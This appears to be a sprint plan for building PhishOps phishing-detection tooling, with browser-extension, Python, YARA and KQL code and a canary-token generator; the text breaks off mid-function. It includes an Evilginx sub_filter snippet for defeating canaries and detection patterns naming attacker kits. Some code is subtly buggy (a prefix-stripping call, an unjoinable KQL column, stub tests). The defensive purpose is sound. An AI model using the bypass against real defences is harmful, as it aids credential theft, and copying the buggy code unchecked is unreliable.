# PhishOps — Gap-to-Build Execution Plan
## March 2026 | Synthesised from Gap Analysis + Gem Research

> **How to use this document:** Work top to bottom. Each sprint is self-contained.
> Every module entry specifies the exact file to touch, the exact API to call, and the
> exact test to write. Nothing is blocked by anything else except where explicitly noted.

---

## Master Roadmap at a Glance

| Sprint | Weeks | Modules | Net New Detection |
|--------|-------|---------|-------------------|
| **Sprint 0** — Quick Wins | 0–1 | FIDO Downgrade · IPFS · LOTL · DocuSign | 4 gaps closed, ~5 days total |
| **Sprint 1** — LLM + Honeytokens | 1–3 | LLMScorer · CSS Honeytoken Generator | Lure CLI fundamentally upgraded |
| **Sprint 2** — VNCGuard + PWAGuard | 3–6 | VNCGuard · ManifestAuditor | Entire WebSocket AiTM class covered |
| **Sprint 3** — TeamsGuard + TPA Sentinel | 6–10 | TeamsGuard · TPA Sentinel | All collaboration-platform phishing covered |
| **Sprint 4** — Web3 + Advanced | 10–16 | DrainerGuard · EtherHiding · StyleAuditor | Web3 surface + CSS blind spot closed |
| **Ongoing** | Continuous | KitRadar Refresh · SVG/XML · Shadow Passkey · CT Logs | Intelligence pipeline maintained |

---

## SPRINT 0 — Quick Wins (5 working days)

*These four changes touch existing code with minimal risk. Each is a 1–3 day task.
Execute these before anything else — they close confirmed exploits with minimal effort.*

---

### S0-A: CTAPGuard — FIDO Authentication Downgrade Rule
**Effort:** 1–2 days | **File:** `extension/background/service_worker.js` (CTAPGuard section)

**What to build:** One new detection rule that fires when a page spoofs a `Safari on Windows`
User-Agent while `window.PublicKeyCredential` is available — the exact Proofpoint August 2025
working Evilginx phishlet technique.

**Exact code to add inside the CTAPGuard detection block:**

```javascript
// CTAPGuard — FIDO Downgrade via User-Agent Spoofing
// Source: Proofpoint research Aug 2025 — working Evilginx phishlet
// "Safari on Windows" is an impossible UA combination; real Safari never runs on Windows
function detectFIDODowngrade() {
  const ua = navigator.userAgent;

  // Signal 1: Safari on Windows (physically impossible — phishlet spoof)
  const safariOnWindows = /Safari\/[\d.]+/.test(ua) &&
                          /Windows NT/.test(ua) &&
                          !/Chrome\//.test(ua) &&
                          !/Edg\//.test(ua);

  // Signal 2: WebAuthn API available but UA claims incapable browser
  const webAuthnAvailable = typeof window.PublicKeyCredential !== 'undefined';

  // Signal 3: Old IE/Trident UA on modern page (another downgrade vector)
  const tridentSpoof = /Trident\//.test(ua) && webAuthnAvailable;

  // Signal 4: Cross-device WebAuthn QR presented from non-local origin
  // Monitor for navigator.credentials.get() with { mediation: 'conditional' }
  // combined with a non-microsoftonline origin — PoisonSeed pattern
  const crossDeviceQR = document.querySelector(
    '[data-testid="cross-device-qr"], .fido-cross-device-qr, img[alt*="QR"]'
  ) !== null;

  if (webAuthnAvailable && (safariOnWindows || tridentSpoof)) {
    emitPhishingAlert({
      type:       'FIDO_DOWNGRADE_UA_SPOOF',
      severity:   'Critical',
      riskScore:  0.92,
      signals:    [
        safariOnWindows ? 'safari_on_windows_ua_impossible_combination' : null,
        tridentSpoof    ? 'ie_trident_ua_with_modern_webauthn_api'      : null,
      ].filter(Boolean),
      detail: `navigator.userAgent spoofed to non-FIDO-capable browser while WebAuthn API
               is present. Matches Proofpoint Aug 2025 Evilginx FIDO downgrade phishlet.
               Entra ID will silently fall back to password/OTP.`,
      mitre:  'T1556.006 — Modify Authentication Process: Multi-Factor Authentication',
    });
  }

  if (crossDeviceQR && window.location.hostname !== 'login.microsoftonline.com') {
    emitPhishingAlert({
      type:      'FIDO_CROSS_DEVICE_AUTH_SUSPICIOUS_ORIGIN',
      severity:  'High',
      riskScore: 0.75,
      signals:   ['cross_device_webauthn_qr_on_non_microsoft_domain'],
      detail:    'Cross-device WebAuthn QR code on non-Microsoft domain. PoisonSeed pattern.',
      mitre:     'T1111 — Multi-Factor Authentication Interception',
    });
  }
}

// Wire into content script on page load and on DOM mutation
document.addEventListener('DOMContentLoaded', detectFIDODowngrade);
new MutationObserver(detectFIDODowngrade).observe(
  document.body, { childList: true, subtree: true }
);
```

**Test to add:** `extension/__tests__/ctapguard.fido_downgrade.test.js`
```javascript
describe('CTAPGuard — FIDO Downgrade', () => {
  it('fires on Safari/Windows UA + WebAuthn present', () => { ... });
  it('does not fire on real Chrome/Windows UA', () => { ... });
  it('does not fire on real Safari/macOS UA', () => { ... });
  it('fires on Trident UA with PublicKeyCredential defined', () => { ... });
});
```

**KQL to add to Sentinel library:**
```kql
// CTAPGuard: FIDO Downgrade — Entra ID authentication after UA downgrade
BrowserPhishingTelemetry_CL
| where EventType_s == "FIDO_DOWNGRADE_UA_SPOOF"
| join kind=inner (
    SigninLogs
    | where TimeGenerated > ago(10m)
    | where AuthenticationRequirement == "singleFactorAuthentication"
    | project UserPrincipalName, IPAddress, TimeGenerated
) on $left.TabId_d == $right.TabId_d
| extend Alert = "FIDO downgrade followed by single-factor auth — possible AiTM"
```

---

### S0-B: Lure CLI — IPFS / Decentralised Hosting Detection
**Effort:** 1 day | **Files:** `lure/lure/modules/extractor.py`, `lure/lure/modules/scorer.py`

**Step 1 — Add to `extractor.py`:** New URL classification function.

```python
# lure/lure/modules/extractor.py
# Add after existing URL extraction logic

IPFS_GATEWAYS = {
    'ipfs.io', 'cloudflare-ipfs.com', 'dweb.link', 'nftstorage.link',
    'gateway.pinata.cloud', 'via0.com', 'astyanax.io', 'ipfs.jpu.jp',
    'fleek.cool', 'w3s.link', 'cf-ipfs.com', 'ipfs.eth.aragon.network',
    'ipfs.fleek.co', 'hub.textile.io', 'ipfs.runfission.com',
}

CLOUDFLARE_R2_PATTERN = re.compile(r'https?://[a-z0-9\-]+\.r2\.dev/', re.IGNORECASE)

# CIDv0: base58 Qm + 44 chars
IPFS_CIDv0 = re.compile(r'/ipfs/(Qm[1-9A-HJ-NP-Za-km-z]{44})')
# CIDv1: base32 bafy/bafk + 50+ chars
IPFS_CIDv1 = re.compile(r'/ipfs/(baf[yk][a-z2-7]{50,})', re.IGNORECASE)

def classify_ipfs_url(url: str) -> dict | None:
    """Detect IPFS gateway or Cloudflare R2 hosted phishing URLs."""
    from urllib.parse import urlparse
    parsed = urlparse(url)
    hostname = parsed.netloc.lower().lstrip('www.')

    is_ipfs_gateway = hostname in IPFS_GATEWAYS
    is_r2_bucket    = bool(CLOUDFLARE_R2_PATTERN.match(url))
    cid_match       = IPFS_CIDv0.search(url) or IPFS_CIDv1.search(url)

    if not (is_ipfs_gateway or is_r2_bucket):
        return None

    return {
        'url':          url,
        'signal':       'IPFS_HOSTED_URL' if is_ipfs_gateway else 'CLOUDFLARE_R2_HOSTED',
        'gateway':      hostname,
        'cid':          cid_match.group(1) if cid_match else None,
        'cid_version':  0 if (cid_match and cid_match.group(1).startswith('Qm')) else 1,
        'takedown_resistant': True,   # immutable content hash
        'note': 'Content-addressed hosting — traditional domain takedown ineffective',
    }
```

**Step 2 — Add to `scorer.py`:** New signal weight.

```python
# In scorer.py SIGNAL_WEIGHTS dict, add:
'IPFS_HOSTED_URL':       1.5,   # Immutable; takedown-resistant; confirmed phishing vector
'CLOUDFLARE_R2_HOSTED':  1.2,   # R2 free tier abuse; documented by SANS ISC 2024

# In score() method:
for url_result in analysis.extracted_urls:
    ipfs = classify_ipfs_url(url_result.url)
    if ipfs:
        signals.append(ipfs['signal'])
        score += SIGNAL_WEIGHTS[ipfs['signal']]
        # Cross-campaign correlation via CID
        if ipfs['cid']:
            iocs.append(f"IPFS_CID:{ipfs['cid']}")
```

**Test to add:** `lure/tests/test_ipfs_detection.py`
```python
def test_ipfs_gateway_detected():
    result = analyse_email_with_url('https://cloudflare-ipfs.com/ipfs/QmXoypiz...')
    assert 'IPFS_HOSTED_URL' in result.signals

def test_r2_bucket_detected():
    result = analyse_email_with_url('https://pub-abc123.r2.dev/phish.html')
    assert 'CLOUDFLARE_R2_HOSTED' in result.signals

def test_cid_extracted_for_correlation():
    r = classify_ipfs_url('https://ipfs.io/ipfs/QmXoypizjW3WknFiJnKLwHCnL72...')
    assert r['cid'].startswith('Qm')
    assert r['cid_version'] == 0
```

**YARA rule to add to `lure/rules/phishing_custom.yar`:**
```yara
rule phishops_ipfs_hosted_phishing {
  meta:
    description = "Detects URLs pointing to IPFS gateways or Cloudflare R2 buckets"
    severity    = "medium"
    source      = "SANS ISC Mar 2024, Darktrace late 2025, Trustwave Dec 2025"
  strings:
    $gw1 = "cloudflare-ipfs.com" nocase
    $gw2 = "ipfs.io/ipfs/"       nocase
    $gw3 = "dweb.link/ipfs/"     nocase
    $gw4 = "nftstorage.link"     nocase
    $r2  = ".r2.dev/"            nocase
    $cid = /Qm[1-9A-HJ-NP-Za-km-z]{44}/
  condition:
    any of ($gw*, $r2) or $cid
}
```

---

### S0-C: PhishVision — LOTL Trusted-Domain Signal Enhancement
**Effort:** 2 days | **File:** `phishvision/detector.py` (or equivalent pipeline file)

**What to build:** When PhishVision detects a credential-requiring page (CRP) hosted on a
known LOTL platform AND the detected brand logo does not match the hosting company, elevate
the risk score rather than silently passing the domain check.

```python
# phishvision/detector.py — add after existing brand matching logic

LOTL_TRUSTED_DOMAINS = {
    # Map: hosting domain → which brand it legitimately hosts
    'sharepoint.com':         {'microsoft', 'office365', 'onedrive'},
    'microsoftforms.net':     {'microsoft'},
    'docs.google.com':        {'google'},
    'sites.google.com':       {'google'},
    'forms.gle':              {'google'},
    'wordpress.com':          set(),   # empty = no brand is legitimate here
    'canva.com':              set(),
    'netlify.app':            set(),
    'github.io':              set(),
    'notion.site':            set(),
    'airtable.com':           set(),
    'jotform.com':            set(),
    'typeform.com':           set(),
    'wixsite.com':            set(),
    'squarespace.com':        set(),
    'weebly.com':             set(),
    'mailchimp.com':          set(),
    'hubspotpagebuilder.com': set(),
    'calendly.com':           set(),
}

def check_lotl_brand_mismatch(hosting_domain: str,
                               detected_brand: str,
                               is_crp: bool) -> dict | None:
    """
    Flag when a credential-requiring page on a trusted hosting platform
    shows a brand logo that doesn't match that platform's legitimate scope.

    Example: sharepoint.com page showing PayPal logo → phishing.
    Example: sharepoint.com page showing Microsoft logo → legitimate.
    Example: notion.site page showing any login form → suspicious regardless.
    """
    if not is_crp:
        return None   # No credential form → not a phishing-relevant page

    # Normalise: strip subdomain, get root domain
    root = '.'.join(hosting_domain.split('.')[-2:])

    if root not in LOTL_TRUSTED_DOMAINS:
        return None   # Not a known LOTL platform

    legitimate_brands = LOTL_TRUSTED_DOMAINS[root]

    brand_normalised = detected_brand.lower().strip()

    # Case 1: Platform has no legitimate brand association (Canva, Notion, etc.)
    if not legitimate_brands:
        return {
            'signal':         'LOTL_CREDENTIAL_PAGE_NO_LEGITIMATE_BRAND',
            'hosting_domain': hosting_domain,
            'detected_brand': detected_brand,
            'risk_boost':     0.30,
            'note':           f'{root} has no legitimate reason to host a login form',
            'source':         'KnowBe4 Mar 2026, Perception Point 2024',
        }

    # Case 2: Brand detected does not match platform's legitimate scope
    if brand_normalised not in legitimate_brands and brand_normalised != root:
        return {
            'signal':         'LOTL_BRAND_DOMAIN_MISMATCH',
            'hosting_domain': hosting_domain,
            'detected_brand': detected_brand,
            'legitimate_for': list(legitimate_brands),
            'risk_boost':     0.45,   # High confidence mismatch
            'note':           f'{detected_brand} login form hosted on {root} — impersonation',
            'source':         'Microsoft Security Blog Mar 2026',
        }

    return None   # Legitimate brand on matching platform

# Wire into main detection pipeline:
# if result := check_lotl_brand_mismatch(page_domain, matched_brand, is_crp):
#     final_score += result['risk_boost']
#     signals.append(result['signal'])
```

**Test cases to add:**
```python
def test_paypal_on_sharepoint_flagged():       # Brand mismatch on LOTL domain
def test_microsoft_on_sharepoint_clean():      # Legitimate brand on own platform
def test_login_form_on_notion_flagged():       # Any CRP on zero-brand LOTL platform
def test_non_lotl_domain_not_affected():       # Normal domain unaffected
def test_wordpress_login_form_flagged():       # WordPress .com = LOTL
```

---

### S0-D: Lure CLI — DocuSign / E-Signature YARA Rule
**Effort:** 1 day | **File:** `lure/rules/phishing_custom.yar`

```yara
rule phishops_esignature_lure {
  meta:
    description  = "Detect DocuSign/Adobe Sign envelopes with suspicious embedded redirect URLs"
    severity     = "high"
    mitre        = "T1566.001"
    source       = "Abnormal Security Q1 2026, FBI IC3 advisory"
    author       = "PhishOps"
  strings:
    // Platform identifiers
    $ds1 = "docusign.net"     nocase
    $ds2 = "docusign.com"     nocase
    $as1 = "acrobat.adobe.com" nocase
    $as2 = "sign.adobe.com"   nocase
    $hs1 = "hellosign.com"    nocase
    $pd1 = "pandadoc.com"     nocase

    // Suspicious redirect: href pointing outside platform domains
    // Negative lookahead: NOT docusign.*, esign.*, adobe.*, hellosign.*
    $redirect = /href=["'][^"']*https?:\/\/(?!(www\.)?(docusign|esign|adobe|hellosign|pandadoc|adobesign)\.[a-z]{2,6})[a-z0-9\-]{4,63}\.[a-z]{2,10}\/[^"']{20,}["']/i

    // Embedded QR codes in e-signature lures (quishing variant)
    $qr_embed = /src=["'][^"']*\.png["'][^>]*alt=["'][^"']*qr|scan[^"']*["']/i

    // Urgency language commonly paired with fake DocuSign lures
    $urgency1 = "action required"      nocase
    $urgency2 = "expires in"           nocase
    $urgency3 = "sign before"          nocase
    $urgency4 = "complete your action" nocase
  condition:
    (any of ($ds*, $as*, $hs*, $pd*)) and
    ($redirect or $qr_embed) and
    (1 of ($urgency*))
}

rule phishops_esignature_reply_to_mismatch {
  meta:
    description = "E-signature email where Reply-To domain differs from DocuSign platform"
    severity    = "high"
  strings:
    $platform  = /From:.*(@docusign\.(net|com)|@adobesign\.com)/i
    $reply_mismatch = /Reply-To:.*@(?!docusign\.|adobesign\.|adobe\.)[a-z0-9\-]+\.[a-z]{2,}/i
  condition:
    $platform and $reply_mismatch
}
```

---

## SPRINT 1 — LLM Detection + CSS Honeytokens (Weeks 1–3)

---

### S1-A: LLMScorer — AI-Generated Phishing Detection in Lure CLI
**Effort:** 2–3 weeks | **New file:** `lure/lure/modules/llm_scorer.py`

**Architecture:** Stage E signal addition. Uses GPT-2 perplexity + linguistic features.
No external API calls — all local, no PII leakage.

#### Step 1: Install dependencies
```bash
pip install transformers torch scikit-learn textstat
# GPT-2 model (~500MB download once, then cached)
# textstat for readability metrics (Flesch-Kincaid, etc.)
```

#### Step 2: Build `lure/lure/modules/llm_scorer.py`

```python
"""
LLMScorer — Lure CLI Stage E addition
Detects AI/LLM-generated phishing emails via statistical and linguistic signals.

Sources:
  - MDPI Electronics Jun 2025: "ML and Watermarking for AI-Generated Phishing"
    → Logistic Regression at 99.03% accuracy on WormGPT-generated samples
  - arXiv Oct 2025: "Robust ML-based Detection of LLM-Generated Phishing Emails"
  - Dataset: Mendeley "Human-LLM Generated Phishing-Legitimate Emails Dataset"
"""

from __future__ import annotations
import math, re, statistics
from dataclasses import dataclass
from functools import lru_cache
from typing import Optional

import textstat


@dataclass
class LLMSignals:
    perplexity:            float   # GPT-2 perplexity (lower = more LLM-like)
    burstiness:            float   # sentence-length std dev (lower = more uniform = LLM)
    flesch_kincaid:        float   # readability score
    type_token_ratio:      float   # lexical diversity (LLMs have lower TTR)
    spelling_error_count:  int     # LLMs have near-zero spelling errors
    register_formality:    float   # 0.0=casual, 1.0=formal (LLMs trend formal)
    llm_probability:       float   # final composite score 0.0–1.0
    signals:               list[str]


@lru_cache(maxsize=1)
def _load_gpt2_model():
    """Lazy-load GPT-2 tokenizer and model. Cached for session reuse."""
    from transformers import GPT2Tokenizer, GPT2LMHeadModel
    import torch
    tokenizer = GPT2Tokenizer.from_pretrained('gpt2')
    model     = GPT2LMHeadModel.from_pretrained('gpt2')
    model.eval()
    return tokenizer, model


def compute_gpt2_perplexity(text: str, max_tokens: int = 512) -> float:
    """
    Compute GPT-2 perplexity of the input text.
    LLM-generated text has LOW perplexity vs GPT-2 (~10–50).
    Human-written text has HIGHER perplexity (~100–300+).
    Threshold for 'suspicious': perplexity < 65 (from MDPI 2025 paper).
    """
    try:
        import torch
        tokenizer, model = _load_gpt2_model()
        tokens = tokenizer.encode(text[:3000], return_tensors='pt', truncation=True,
                                  max_length=max_tokens)
        with torch.no_grad():
            loss = model(tokens, labels=tokens).loss
        return math.exp(loss.item())
    except Exception:
        return 150.0   # Default: assume human-written if model unavailable


def compute_burstiness(text: str) -> float:
    """
    Burstiness = std_dev(sentence_lengths) / mean(sentence_lengths).
    LLM text: burstiness ~0.2–0.4 (unnaturally uniform).
    Human text: burstiness ~0.5–0.9.
    """
    sentences = re.split(r'[.!?]+', text)
    lengths   = [len(s.split()) for s in sentences if len(s.split()) > 3]
    if len(lengths) < 3:
        return 0.5   # Too short to assess
    mean = statistics.mean(lengths)
    if mean == 0:
        return 0.5
    return statistics.stdev(lengths) / mean


def compute_type_token_ratio(text: str) -> float:
    """Lexical diversity. LLMs have lower TTR (repetitive vocabulary patterns)."""
    words = re.findall(r'\b[a-zA-Z]{3,}\b', text.lower())
    if len(words) < 20:
        return 0.85   # Too short to assess
    # Use moving window TTR for longer texts
    window   = min(100, len(words))
    windows  = [words[i:i+window] for i in range(0, len(words)-window, window//2)]
    ttrs     = [len(set(w)) / len(w) for w in windows if w]
    return statistics.mean(ttrs) if ttrs else 0.85


def detect_spelling_errors(text: str) -> int:
    """
    Count obvious spelling errors using a simple heuristic.
    LLM-generated text has near-zero errors; human phishing often has ~2–5.
    """
    # Uses textstat's readability — proper NLP spellcheck requires pyenchant
    # Simple heuristic: count words not matching common patterns
    # (Placeholder — replace with pyenchant for production)
    suspicious_word_endings = re.findall(
        r'\b[A-Z][a-z]+[A-Z][a-z]+\b', text  # CamelCase mid-word = typo indicator
    )
    return len(suspicious_word_endings)


FORMAL_REGISTER_PHRASES = [
    r'\bplease\s+(find|see|review|note|be\s+advised)\b',
    r'\bkindly\b', r'\bhereby\b', r'\bthereafter\b', r'\bnotwithstanding\b',
    r'\bper\s+our\s+(agreement|policy|request)\b',
    r'\bfor\s+your\s+(records|reference|immediate\s+attention)\b',
    r'\bfailure\s+to\s+(comply|respond|verify)\b',
    r'\bactionable\b', r'\btime.sensitive\b', r'\bimperative\b',
]

def compute_register_formality(text: str) -> float:
    """Score 0.0–1.0. LLMs writing phishing tend toward formal register."""
    lower = text.lower()
    hits  = sum(1 for p in FORMAL_REGISTER_PHRASES if re.search(p, lower))
    # Normalise: 0 hits = 0.0, 4+ hits = 1.0
    return min(hits / 4.0, 1.0)


def score_llm_probability(signals: LLMSignals) -> float:
    """
    Composite LLM probability from individual signals.
    Weighted based on MDPI 2025 paper feature importance.
    """
    score = 0.0

    # Perplexity (weight 35%) — most discriminative single feature
    if signals.perplexity < 40:
        score += 0.35
    elif signals.perplexity < 65:
        score += 0.20
    elif signals.perplexity < 100:
        score += 0.08

    # Burstiness (weight 25%)
    if signals.burstiness < 0.25:
        score += 0.25   # Extremely uniform = very likely LLM
    elif signals.burstiness < 0.40:
        score += 0.15

    # Type-token ratio (weight 20%)
    if signals.type_token_ratio < 0.55:
        score += 0.20
    elif signals.type_token_ratio < 0.65:
        score += 0.10

    # Zero spelling errors in formal email (weight 10%)
    if signals.spelling_error_count == 0 and signals.register_formality > 0.4:
        score += 0.10

    # Formal register in credential-request context (weight 10%)
    if signals.register_formality > 0.7:
        score += 0.10

    return min(score, 1.0)


def analyse_email_body(body: str) -> LLMSignals:
    """Full LLM signal extraction from email body text."""
    if not body or len(body.split()) < 30:
        return LLMSignals(150, 0.7, 50, 0.85, 0, 0.2, 0.0, ['too_short'])

    perplexity   = compute_gpt2_perplexity(body)
    burstiness   = compute_burstiness(body)
    fk_score     = textstat.flesch_kincaid_grade(body)
    ttr          = compute_type_token_ratio(body)
    spelling     = detect_spelling_errors(body)
    formality    = compute_register_formality(body)

    raw_signals = LLMSignals(
        perplexity           = perplexity,
        burstiness           = burstiness,
        flesch_kincaid       = fk_score,
        type_token_ratio     = ttr,
        spelling_error_count = spelling,
        register_formality   = formality,
        llm_probability      = 0.0,   # filled below
        signals              = [],
    )

    raw_signals.llm_probability = score_llm_probability(raw_signals)

    # Build human-readable signal list
    signal_list = []
    if perplexity < 65:
        signal_list.append(f'low_gpt2_perplexity_{perplexity:.0f}')
    if burstiness < 0.35:
        signal_list.append(f'low_sentence_burstiness_{burstiness:.2f}')
    if ttr < 0.60:
        signal_list.append(f'low_type_token_ratio_{ttr:.2f}')
    if spelling == 0:
        signal_list.append('zero_spelling_errors')
    if formality > 0.6:
        signal_list.append(f'high_formal_register_{formality:.2f}')

    raw_signals.signals = signal_list
    return raw_signals


# Add to scorer.py SIGNAL_WEIGHTS:
# 'LLM_GENERATED_HIGH':    3.0,   # llm_probability > 0.75
# 'LLM_GENERATED_MEDIUM':  1.5,   # llm_probability 0.45–0.75
```

#### Step 3: Wire into Lure CLI pipeline
```python
# In lure/lure/modules/scorer.py, inside score() method:
from .llm_scorer import analyse_email_body

llm_result = analyse_email_body(analysis.plain_text_body or analysis.html_body_stripped)
if llm_result.llm_probability > 0.75:
    signals.append('LLM_GENERATED_HIGH')
    score += SIGNAL_WEIGHTS['LLM_GENERATED_HIGH']
    details['llm_analysis'] = {
        'probability': llm_result.llm_probability,
        'perplexity':  llm_result.perplexity,
        'signals':     llm_result.signals,
    }
elif llm_result.llm_probability > 0.45:
    signals.append('LLM_GENERATED_MEDIUM')
    score += SIGNAL_WEIGHTS['LLM_GENERATED_MEDIUM']
```

#### Step 4: Update CLI output to show LLM analysis
```bash
# Output example:
lure analyze email.eml

Verdict: LIKELY_PHISHING (6.5)
Signals: SPF_FAIL, LLM_GENERATED_HIGH, REPLY_TO_MISMATCH
LLM Analysis:
  Probability:   0.81 (HIGH)
  GPT-2 Perplexity: 42.3 (low — LLM distribution)
  Burstiness:    0.22 (uniform sentence structure)
  Signals:       low_gpt2_perplexity_42, low_burstiness_0.22, zero_spelling_errors
```

#### Tests to add: `lure/tests/test_llm_scorer.py`
```python
def test_wormgpt_sample_scores_high():          # Sample from Mendeley dataset
def test_human_phishing_scores_lower():         # Classic human-written phishing
def test_legitimate_email_scores_clean():       # Marketing/transactional email
def test_short_body_gracefully_handled():       # < 30 words
def test_perplexity_below_threshold_signals():  # perplexity < 65
```

---

### S1-B: CSS Honeytoken Generator Module
**Effort:** 1–2 weeks | **New tool:** `honeytoken/generate.py`

**What it builds:** A command-line tool that generates CSS and JavaScript canarytoken
configurations for Microsoft Entra ID custom branding pages. When Evilginx proxies the
Entra ID login page, the canarytoken fires — exposing the phishing domain in the Referer.

```python
#!/usr/bin/env python3
"""
PhishOps Honeytoken Generator
Generates CSS canarytoken payloads for Microsoft Entra ID custom branding.

Usage:
  python honeytoken/generate.py \
    --callback-url https://your-siem.com/api/canary \
    --tenant-id your-entra-tenant-id \
    --format css

Deployment:
  1. Run this tool to generate the CSS snippet
  2. Upload to Entra ID: Entra ID → Company Branding → Custom CSS
  3. When Evilginx proxies the login page, the background-image request fires
     with Referer: https://phishing-domain.com
  4. Your SIEM/webhook receives the alert with the phishing domain

Source: Zolder.io Jan 2024, PwC Dark Lab Apr 2024, Spotit Jun 2024
Bypass caveat: Evilginx operators can strip this via CSP sub_filter injection.
  Still catches ~80% of commodity Evilginx deployments.
"""

import argparse, secrets, json, datetime
from pathlib import Path


BYPASS_WARNING = """
⚠️  BYPASS CAVEAT (document for portfolio):
Sophisticated Evilginx operators can bypass this via:
  sub_filters:
    - { search: "Content-Security-Policy:",
        replace: "Content-Security-Policy: img-src 'none';" }
This adds a CSP header stripping image loads.
Mitigation: Use multiple canary channels (JS + CSS + font-face + favicon).
Source: "Clipping the Canary's Wings", X33fcon 2024
"""

def generate_css_canary(callback_url: str, token: str, tenant_id: str) -> str:
    """
    Generate CSS with embedded background-image canarytoken.
    The URL includes tenant_id and a random token for campaign attribution.
    """
    canary_url = f"{callback_url}?token={token}&tenant={tenant_id}&ts={{now}}"
    return f"""
/* PhishOps Canarytoken — Entra ID Custom Branding CSS
   Generated: {datetime.datetime.utcnow().isoformat()}Z
   Token: {token}
   Deploy via: Entra ID → Company Branding → Custom CSS */

/* Primary canary: background-image on login container */
#lightbox, .login-paginated-container, .table-cell-content {{
  background-image: url('{callback_url}?t={token}&c=css&tid={tenant_id}') !important;
  background-size: 1px 1px;
  background-repeat: no-repeat;
  background-position: -9999px -9999px;  /* invisible but loads */
}}

/* Secondary canary: @font-face (harder to strip via CSP) */
@font-face {{
  font-family: 'corporate-font';
  src: url('{callback_url}?t={token}&c=font&tid={tenant_id}') format('woff2');
}}

/* Tertiary: custom property that triggers a CSS paint worklet load */
.table-cell-content::before {{
  content: url('{callback_url}?t={token}&c=content&tid={tenant_id}');
  display: none;
}}
"""

def generate_js_canary(callback_url: str, token: str, tenant_id: str) -> str:
    """
    Generate JavaScript canarytoken for Entra ID custom branding JS field.
    Sends canary on page load AND on each form interaction.
    """
    return f"""
/* PhishOps JS Canarytoken — deploy in Entra ID custom branding JS field */
(function() {{
  const cb  = '{callback_url}';
  const tok = '{token}';
  const tid = '{tenant_id}';
  const ref = encodeURIComponent(document.referrer);
  const dom = encodeURIComponent(window.location.hostname);

  // Fire on load
  navigator.sendBeacon(cb + '?t=' + tok + '&c=js_load&tid=' + tid +
                       '&ref=' + ref + '&dom=' + dom);

  // Fire on credential input — captures exact moment of AiTM interception
  document.addEventListener('input', function(e) {{
    if (e.target.type === 'password' || e.target.name === 'loginfmt') {{
      navigator.sendBeacon(cb + '?t=' + tok + '&c=cred_input&tid=' + tid +
                           '&ref=' + ref + '&dom=' + dom);
    }}
  }}, {{ once: true }});
}})();
"""

def generate_sentinel_kql(callback_url: str, token: str) -> str:
    """
    Generate Sentinel KQL to detect canarytoken fires with phishing domain in Referer.
    """
    return f"""
// PhishOps Canarytoken Alert — Evilginx AiTM Detection
// Fires when canarytoken loads from a domain other than login.microsoftonline.com
// Token: {token}
// Deploy in: Microsoft Sentinel → Analytics → Custom Detection Rule

CommonSecurityLog
| where TimeGenerated > ago(1h)
| where DeviceVendor == "PhishOps" and DeviceProduct == "HoneyToken"
| extend Token        = extract("t=([a-f0-9]+)", 1, RequestURL)
| extend Channel      = extract("c=([a-z_]+)", 1, RequestURL)
| extend RefererDom   = extract("ref=([^&]+)", 1, RequestURL)
| extend ReportingDom = extract("dom=([^&]+)", 1, RequestURL)
| where Token == "{token}"
| where RefererDom !contains "microsoftonline.com"
       and RefererDom !contains "microsoft.com"
       and RefererDom !contains "login.live.com"
| extend Alert = strcat(
    "CANARYTOKEN FIRED — Evilginx AiTM detected. ",
    "Phishing domain: ", RefererDom,
    " | Channel: ", Channel,
    " | Token: {token}"
  )
| project TimeGenerated, RefererDom, ReportingDom, Channel, Alert
| order by TimeGenerated desc
"""

def main():
    parser = argparse.ArgumentParser(description='PhishOps Honeytoken Generator')
    parser.add_argument('--callback-url',  required=True)
    parser.add_argument('--tenant-id',     required=True)
    parser.add_argument('--format',        choices=['css','js','kql','all'], default='all')
    parser.add_argument('--output-dir',    default='./honeytoken_output')
    args = parser.parse_args()

    token = secrets.token_hex(16)
    out   = Path(args.output_dir)
    out.mkdir(exist_ok=True)

    if args.format in ('css', 'all'):
        css = generate_css_canary(args.callback_url, token, args.tenant_id)
        (out / f'entra_canary_{token[:8]}.css').write_text(css)
        print(f"[+] CSS canary written: entra_canary_{token[:8]}.css")

    if args.format in ('js', 'all'):
        js = generate_js_canary(args.callback_url, token, args.tenant_id)
        (out / f'entra_canary_{token[:8]}.js').write_text(js)
        print(f"[+] JS canary written:  entra_canary_{token[:8]}.js")

    if args.format in ('kql', 'all'):
        kql = generate_sentinel_kql(args.callback_url, token)
        (out / f'sentinel_canary_{token[:8]}.kql').write_text(kql)
        print(f"[+] KQL alert written:  sentinel_canary_{token[:8]}.kql")

    meta = {'token': token, 'tenant_id': args.tenant_id, 'callback': args.callback_url,
            'generated': datetime.datetime.utcnow().isoformat()}
    (out / f'meta_{token[:8]}.json').write_text(json.dumps(meta, indent=2))

    print(BYPASS_WARNING)
    print(f"\n[+] Deploy instructions:")
    print(f"    1. Entra ID → Company Branding → CSS: upload {token[:8]}.css")
    print(f"    2. Sentinel: import sentinel_canary_{token[:8]}.kql as detection rule")
    print(f"    3. Test: browse to login.microsoftonline.com — no alert should fire")
    print(f"    4. Test via Evilginx proxy: canary should fire with phishing domain")

if __name__ == '__main__':
    main()
```

---

## SPRINT 2 — VNCGuard + PWAGuard (Weeks 3–6)

---

### S2-A: VNCGuard — EvilnoVNC / WebSocket AiTM Detection
**Effort:** 3–4 weeks | **New file:** `extension/content/vncguard.js`
**Background worker additions:** `extension/background/service_worker.js` (VNCGuard section)

**Architecture:** Content script that monitors for noVNC JS library signatures, canvas-based
VNC rendering patterns, and WebSocket connections matching VNC framebuffer traffic.

```javascript
// extension/content/vncguard.js
// VNCGuard — Detects EvilnoVNC and Cuddlephish WebSocket/WebRTC AiTM
// Sources: Push Security Apr 2025, JoelGMSec GitHub, HackerSploit Jul 2025

'use strict';

const VNCGuard = (() => {

  // ── 1. noVNC LIBRARY SIGNATURE DETECTION ─────────────────────────────────
  // noVNC imports rfb.js as its core VNC engine. Any page importing this is
  // either a legitimate remote desktop tool or an AiTM phishing page.
  const NOVNC_SIGNATURES = [
    'noVNC/core/rfb.js',
    'rfb.js',
    '/noVNC/',
    'novnc.min.js',
    'Websock.js',           // noVNC WebSocket wrapper
    'vnc_auto.html',        // noVNC auto-connect page
    'ui.js',                // noVNC UI module
  ];

  function checkNoVNCLibraryImports() {
    const scripts = [...document.querySelectorAll('script[src]')]
      .map(s => s.src);
    const matched = scripts.filter(src =>
      NOVNC_SIGNATURES.some(sig => src.includes(sig))
    );
    return matched;
  }

  // ── 2. CANVAS-WITHOUT-INPUT PATTERN ──────────────────────────────────────
  // A credential-requiring page rendered entirely as a VNC canvas has:
  //   - One or more large <canvas> elements
  //   - Zero <input> fields (impossible for a real login form)
